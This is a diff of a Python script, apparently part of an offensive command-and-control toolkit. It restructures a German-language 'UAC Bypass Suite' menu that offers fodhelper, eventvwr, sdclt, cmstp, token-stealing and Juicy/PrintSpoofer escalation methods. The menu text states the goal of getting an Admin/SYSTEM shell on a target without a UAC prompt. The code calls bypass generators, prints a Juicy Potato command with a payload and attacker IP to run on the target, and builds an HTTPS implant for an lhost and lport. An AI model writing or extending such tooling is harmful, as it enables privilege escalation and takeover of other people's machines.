@@ -2386,30 +2386,32 @@ async def menu_c2():
         if build.lower() in ("j", "y"):
             print()
             await run_tool_live(build_https_exe(lhost, lport, platform))
-        elif choice == "u":
-            banner(); section("🔓  UAC BYPASS SUITE", "7 Methoden — Registry · COM · Token · Potato")
-            info_box([
-                "UAC (User Account Control) verhindert unerlaubte Admin-Aktionen.",
-                "Diese Techniken umgehen UAC ohne den Benutzer um Erlaubnis zu fragen.",
-                "",
-                "Voraussetzung: du hast bereits eine Shell als normaler User",
-                "Ziel: Shell als Admin / SYSTEM ohne UAC-Prompt",
-                "",
-                "Der UAC-Check zeigt welche Methode auf dem Ziel-System funktioniert.",
-            ])
-            print()
-            print(f"  {C}[1]{R} UAC Level prüfen + passende Methode empfehlen")
-            print(f"  {C}[2]{R} fodhelper (Win10/11)")
-            print(f"  {C}[3]{R} eventvwr (Win7-10)")
-            print(f"  {C}[4]{R} sdclt (Win10)")
-            print(f"  {C}[5]{R} computerdefaults (Win10 1803+)")
-            print(f"  {C}[6]{R} cmstp (Win7-11, sehr zuverlässig)")
-            print(f"  {C}[7]{R} Token Steal: Admin → SYSTEM")
-            print(f"  {C}[8]{R} Juicy/PrintSpoofer (SeImpersonatePrivilege)")
-            print()
-            sub = prompt("uac")
-            if sub in ("", "0"):
-                wait_key(); continue
+        wait_key()
+
+    elif choice in ("u", "U"):
+        banner(); section("🔓  UAC BYPASS SUITE", "7 Methoden — Registry · COM · Token · Potato")
+        info_box([
+            "UAC (User Account Control) verhindert unerlaubte Admin-Aktionen.",
+            "Diese Techniken umgehen UAC ohne den Benutzer um Erlaubnis zu fragen.",
+            "",
+            "Voraussetzung: du hast bereits eine Shell als normaler User",
+            "Ziel: Shell als Admin / SYSTEM ohne UAC-Prompt",
+            "",
+            "Der UAC-Check zeigt welche Methode auf dem Ziel-System funktioniert.",
+        ])
+        print()
+        print(f"  {C}[1]{R} UAC Level prüfen + passende Methode empfehlen")
+        print(f"  {C}[2]{R} fodhelper (Win10/11)")
+        print(f"  {C}[3]{R} eventvwr (Win7-10)")
+        print(f"  {C}[4]{R} sdclt (Win10)")
+        print(f"  {C}[5]{R} computerdefaults (Win10 1803+)")
+        print(f"  {C}[6]{R} cmstp (Win7-11, sehr zuverlässig)")
+        print(f"  {C}[7]{R} Token Steal: Admin → SYSTEM")
+        print(f"  {C}[8]{R} Juicy/PrintSpoofer (SeImpersonatePrivilege)")
+        print()
+        sub = prompt("uac")
+        if sub in ("", "0"):
+            wait_key(); return
 
             from tools.c2.uac_bypass import (
                 uac_check_ps1, uac_fodhelper, uac_eventvwr, uac_sdclt,
@@ -2479,8 +2481,6 @@ async def menu_c2():
                     ])
                     print(f"\n  {G}[+] Auf Ziel ausführen:{R}\n")
                     print(f"  {C}{uac_juicy_potato(payload, kali_ip)}{R}")
-
-            wait_key()
 
         wait_key()
 
